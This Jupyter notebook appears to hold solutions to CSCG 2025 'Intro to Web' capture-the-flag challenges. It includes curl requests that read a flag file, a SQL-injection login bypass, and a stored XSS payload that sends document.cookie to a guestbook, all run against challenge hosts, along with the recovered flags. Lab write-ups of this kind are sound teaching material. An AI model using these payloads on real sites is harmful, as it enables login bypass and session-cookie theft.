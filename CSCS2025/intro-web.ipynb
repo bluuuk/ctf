{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Intro 2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "100  1366  100  1366    0     0   3628      0 --:--:-- --:--:-- --:--:--  3623\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "    <title>Intro to Web 2</title>\n",
      "    <meta charset=\"UTF-8\">\n",
      "    <link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\" />\n",
      "</head>\n",
      "<body>\n",
      "<h1>$(GERMAN_CITY) Tram Ticket Machine</h1>\n",
      "\n",
      "<h3>Get your <span style=\"text-decoration: line-through;\">ticket</span> flag here!</h3>\n",
      "<hr>\n",
      "With the help of our state-of-the-art floppy disk switching robots, you can now read the first\n",
      "part of the flag in real time!\n",
      "<p>\n",
      "Flag part 1/4: <span style=\"color: green; font-family: 'Courier New', monospace;\">\n",
      "    CSCG{<span id=\"flag\">........</span></span>\n",
      "\n",
      "<!--\n",
      "No time to wait, right?\n",
      "-->\n",
      "\n",
      "<script>\n",
      "flag = \"l9jj550K\"\n",
      "symbolsRevealed = 0\n",
      "waitTime = 1000;\n",
      "\n",
      "function nextSymbol() {\n",
      "    if (symbolsRevealed >= flag.length) return;\n",
      "    symbolsRevealed++;\n",
      "\n",
      "    waitTime *= 2;\n",
      "    setTimeout(nextSymbol, waitTime);\n",
      "}\n",
      "\n",
      "function spin() {\n",
      "    const flagPart = flag.substr(0, symbolsRevealed);\n",
      "    const alphabet = (\"ABCDEFGHIJKLMNOPRSTUVWXYZabcdefhiklmnorstuvwxz0123456789\")\n",
      "    const randomSymbol =\n",
      "        symbolsRevealed < flag.length\n",
      "            ? alphabet.charAt(Math.floor(Math.random() * alphabet.length))\n",
      "            : \"\";\n",
      "    const suffix = \".\".repeat(Math.max(0, flag.length - 1 - symbolsRevealed));\n",
      "\n",
      "    document.getElementById(\"flag\").innerHTML = flagPart + randomSymbol + suffix;\n",
      "}\n",
      "\n",
      "setTimeout(nextSymbol, waitTime);\n",
      "setInterval(spin, 50);\n",
      "</script>\n",
      "\n",
      "</body>\n",
      "</html>"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "curl -H \"User-Agent: Windows 95\" https://d89e6a69e8ea6e41f4fd7797-1024-intro-web-2.challenge.cscg.live:1337/tram-ticket-machine.html"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "flag = \"CSCG{l9jj550K\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "100   505    0   342  100   163    637    304 --:--:-- --:--:-- --:--:--   942\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "    <title>Intro to Web 2</title>\n",
      "    <meta charset=\"UTF-8\">\n",
      "    <link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\" />\n",
      "</head>\n",
      "<body>\n",
      "<h1>Statistics Console (POST version)</h1>\n",
      "<h3>File Name:\n",
      "<span style=\"font-family: 'Courier New', monospace;\">flag.txt</span></h3>\n",
      "<hr>\n",
      "<pre>\n",
      "Flag part 2/4: UaT0BVvk</pre>\n",
      "</body>\n",
      "</html>\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "curl --header \"Content-Type:multipart/form-data\" --form \"filename=flag.txt\" https://d89e6a69e8ea6e41f4fd7797-1024-intro-web-2.challenge.cscg.live:1337/read-file.php"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "flag += \"UaT0BVvk\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "100   341    0   341    0     0    933      0 --:--:-- --:--:-- --:--:--   931\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "    <title>Intro to Web 2</title>\n",
      "    <meta charset=\"UTF-8\">\n",
      "    <link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\" />\n",
      "</head>\n",
      "<body>\n",
      "<h1>Statistics Console (GET version)</h1>\n",
      "<h3>File Name:\n",
      "<span style=\"font-family: 'Courier New', monospace;\">flag.txt</span></h3>\n",
      "<hr>\n",
      "<pre>\n",
      "Flag part 3/4: Q9Z39J9A</pre>\n",
      "</body>\n",
      "</html>\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "curl -G -X GET -d \"filename=flag.txt\" https://d89e6a69e8ea6e41f4fd7797-1024-intro-web-2.challenge.cscg.live:1337/read-file.php"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "flag += \"Q9Z39J9A\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "flag += \"W4at6R2B}\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Last part was burp :)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'CSCG{l9jj550KUaT0BVvkQ9Z39J9AW4at6R2B}'"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "flag"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Intro 3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Endpoint \n",
    "\n",
    "```js\n",
    "fetch(\"/nodejs/random-hashing\", {\n",
    "    method: \"POST\",\n",
    "    headers: new Headers({'content-type': 'application/json'}),\n",
    "    body: JSON.stringify({chosenNumber: chosenNumber}),\n",
    "})\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "100    86  100    67  100    19    189     53 --:--:-- --:--:-- --:--:--   242\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Here's the first part of your flag, sha256'd 0 times: CSCG{Q8oIoy3P"
     ]
    }
   ],
   "source": [
    "%%bash \n",
    "curl -X POST -H \"Content-Type: application/json\" -d '{\"chosenNumber\":[]}' https://d785066c415b0386f4b68697-1024-intro-web-3.challenge.cscg.live:1337/nodejs/random-hashing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "flag = \"CSCG{Q8oIoy3P\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "smartymcsmartface with the password smart123"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "100   299    0   241  100    58    723    174 --:--:-- --:--:-- --:--:--   900\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "    <title>Intro to Web 3</title>\n",
      "    <meta charset=\"UTF-8\">\n",
      "    <link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\" />\n",
      "</head>\n",
      "<body>\n",
      "<h1>Login</h1>\n",
      "Logged in as: hi\n",
      "<br />Here's your flag part 2/3: s956Uwvv</body>\n",
      "</html>"
     ]
    }
   ],
   "source": [
    "%%bash \n",
    "curl https://d785066c415b0386f4b68697-1024-intro-web-3.challenge.cscg.live:1337/login.php \\\n",
    "    -X POST \\\n",
    "    -d \"username=smartymcsmartface\" \\\n",
    "    -d \"password=' UNION SELECT 'hi','t\" \\\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "flag += \"s956Uwvv\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "XSS\n",
    "\n",
    "```html\n",
    "Done\n",
    "<script>\n",
    "fetch(\"https://d785066c415b0386f4b68697-1024-intro-web-3.challenge.cscg.live:1337/guestbook.php\", {\n",
    "    method: \"POST\",\n",
    "    body: new URLSearchParams({\n",
    "        username: \"'sessionid'\",\n",
    "        content: document.cookie, \n",
    "    })\n",
    "})\n",
    "</script>\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "100   925    0   895  100    30   1980     66 --:--:-- --:--:-- --:--:--  2050\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "    <title>Intro to Web 3</title>\n",
      "    <meta charset=\"UTF-8\">\n",
      "    <link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\" />\n",
      "</head>\n",
      "<body>\n",
      "<h1>Guestbook</h1>\n",
      "\n",
      "<h3>Add an entry</h3>\n",
      "<hr>\n",
      "<span style=\"color: green\">Entry added!</span><p>\n",
      "<form method=\"POST\" action=\"guestbook.php\">\n",
      "    <label for=\"username\">Username (max 10 characters)</label>\n",
      "    <input id=\"username\" name=\"username\" type=\"text\" maxlength=\"10\">\n",
      "    <br />\n",
      "    <label for=\"content\">Content (max 200 characters)</label>\n",
      "    <textarea id=\"content\" name=\"content\" type=\"text\" maxlength=\"200\"></textarea>\n",
      "    <br />\n",
      "    <input type=\"submit\" value=\"Send!\">\n",
      "</form>\n",
      "\n",
      "<h3>Entries</h3>\n",
      "<hr>\n",
      "<ul>\n",
      "<li>[2025-03-04 13:24:21.976069] @admin: Hello, welcome to my guestbook!</li><li>[2025-03-15 02:14:10.040691] @'test 1': 'hi'</li></ul>\n",
      "\n",
      "<h3>Secret Flag Info</h3>\n",
      "<hr>\n",
      "Only the admin can access the secret flag!\n",
      "</body>\n",
      "</html>\n"
     ]
    }
   ],
   "source": [
    "%%bash \n",
    "curl https://d785066c415b0386f4b68697-1024-intro-web-3.challenge.cscg.live:1337/guestbook.php \\\n",
    "    -X POST \\\n",
    "    -d \"username='test 1'\" \\\n",
    "    -d \"content='hi'\" \\"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "199"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(\"\"\"\n",
    "<script>fetch(\"https://d785066c415b0386f4b68697-1024-intro-web-3.challenge.cscg.live:1337/guestbook.php\",{method:\"POST\",body: new URLSearchParams({username:\"s\",content: document.cookie})})</script>\n",
    "\"\"\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'CSCG{Q8oIoy3Ps956UwvvWIfJAzNs} '"
      ]
     },
     "execution_count": 40,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "flag += \"WIfJAzNs} \"\n",
    "flag"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
